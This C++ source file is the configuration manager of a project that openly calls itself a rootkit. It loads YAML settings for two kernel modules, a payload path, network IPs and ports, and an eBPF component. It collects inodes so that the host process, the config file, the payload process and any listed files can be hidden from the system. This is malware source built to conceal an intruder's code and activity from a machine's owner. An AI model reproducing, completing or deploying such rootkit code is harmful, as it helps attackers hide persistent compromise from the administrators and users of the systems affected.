#include "rootkit/ConfigManager.hpp"
#include "rootkit/Utils.hpp"

#include <cstdint>
#include <filesystem>
#include <optional>
#include <stdint.h>
#include <unistd.h>
#include <yaml-cpp/exceptions.h>
#include <iostream>

using namespace rootkit;

ConfigManager::ConfigManager(const pid_t payload_pid)
    :rootkit::ConfigManager(CONFIG_PATH, payload_pid)
{}

ConfigManager::ConfigManager(const std::string& config_path, const pid_t payload_pid)
    :config_path(config_path), payload_pid(payload_pid),
    is_config_ready(false)
{
}

bool ConfigManager::read() {
    try {
        YAML::Node config = YAML::LoadFile(config_path);
        // Configure rnet Kernel module
        rnetConf.module_path = config["rnet"]["path"].as<std::string>();
        rnetConf.module_name = config["rnet"]["name"].as<std::string>();

        // Get all IPs and ports
        for (const auto& ip_and_port : config["rnet"]["ips_and_ports"]) {
            const std::string ip = ip_and_port["ip"].as<std::string>();
            const uint16_t port = ip_and_port["port"].as<uint16_t>();
            rnetConf.ips_and_ports.push_back({ip, port});
        }


        // Configure rt kernel module
        rtConf.module_path = config["rt"]["module_path"].as<std::string>();
        rtConf.module_name = config["rt"]["module_name"].as<std::string>();
        rtConf.program_path = config["rt"]["program_path"].as<std::string>();
        // Convert program path to absoule path
        rtConf.program_path = std::filesystem::absolute(rtConf.program_path);
        rtConf.program_cwd = utils::get_cwd();

        // Configure bpf program
        // If true, get inode of /proc/<self>
        if (config["bpf_program_config"]["hide_host"].as<bool>()) {
            bpfConf.hide_host = true;
            auto inode_opt = utils::get_inode_of_process(getppid());
            if (inode_opt.has_value())
                bpfConf.inodes.push_back(inode_opt.value());
        }

        // If true, get inode of <config_path>
        if (config["bpf_program_config"]["hide_config"].as<bool>()) {
            bpfConf.hide_config = true;
            auto inode_opt = utils::get_inode_of_file(config_path);
            if (inode_opt.has_value())
                bpfConf.inodes.push_back(inode_opt.value());
        }

        // If true, get inode of /proc/<payload>
        if (config["bpf_program_config"]["hide_payload"].as<bool>()) {
            bpfConf.hide_payload = true;
            if (payload_pid != 0) {
                auto inode_opt = utils::get_inode_of_process(payload_pid);
                if (inode_opt.has_value())
                    bpfConf.inodes.push_back(inode_opt.value());
            }
        }

        // Get all additional inodes
        for (const auto& file : config["bpf_program_config"]["files_to_hide"]) {
            std::string file_str = file.as<std::string>();
            auto inode = utils::get_inode_of_file(std::filesystem::absolute(file_str));
            if (inode.has_value())
                bpfConf.inodes.push_back(inode.value());
        }

        // Load payload path
        payloadConf.path = config["payload"]["path"].as<std::string>();
    } catch (YAML::Exception e) {
        std::cerr << "Error parsing YAML: " << e.what() << std::endl;
        return false;
    }

    this->is_config_ready = true;
    return true;
}


void ConfigManager::add_payload_pid(pid_t pid) {
    if (!this->is_config_ready) return;

    this->payload_pid = pid;

    if (bpfConf.hide_payload) {
        auto inode_opt = utils::get_inode_of_process(payload_pid);
        if (inode_opt.has_value())
            bpfConf.inodes.push_back(inode_opt.value());
    }
}

std::optional<RtConfig> ConfigManager::get_rt_config() {
    if (is_config_ready)
        return rtConf;
    return std::nullopt;
}

std::optional<RnetConfig> ConfigManager::get_rnet_config() {
    if (is_config_ready)
        return rnetConf;
    return std::nullopt;
}

std::optional<RootkitBpfConfig> ConfigManager::get_bpf_config() {
    if (is_config_ready)
        return bpfConf;
    return std::nullopt;
}

std::optional<PayloadConfig> ConfigManager::get_payload_config() {
    if (is_config_ready)
        return payloadConf;
    return std::nullopt;
}
